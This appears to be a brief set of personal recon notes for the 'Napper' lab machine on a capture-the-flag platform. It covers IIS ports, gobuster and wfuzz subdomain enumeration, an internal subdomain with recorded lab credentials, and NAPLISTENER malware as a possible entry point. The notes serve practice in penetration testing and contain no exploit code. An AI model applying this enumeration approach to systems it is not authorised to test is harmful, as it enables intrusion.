This windows box only has a website running on 80 and 443, accessing these ports will simple redirect you to https://app.napper.htb/

Gobuster didnt show much other than the sitemap.xml

The site seems to be a jumble of posts about various topics like .NET, Reverse Engineering, IIS, Golang, etc.

https://app.napper.htb/page/*/ --> May be injectable? [NOT INJECTABLE]

The web-server is an IIS, but we dont have any use of cookies, nor are there any login pages I've found on the base site so far.

Port 7680 is running some kinda of Pando-Pub, possible from kind of FTP related entity.

When using wfuzz to enum subdomains the url must be https if the site is https, otherwise this will give us bad enumeration outputs

We did find a forbidden area in the domain, internal.napper.htb
To get inside the internal subdom ==> example:ExamplePassword

This NAPLISTENER thats mentioned in the malware notes seems to be a possible Vector, if this is in real-time affecting the machine and is exploitable.
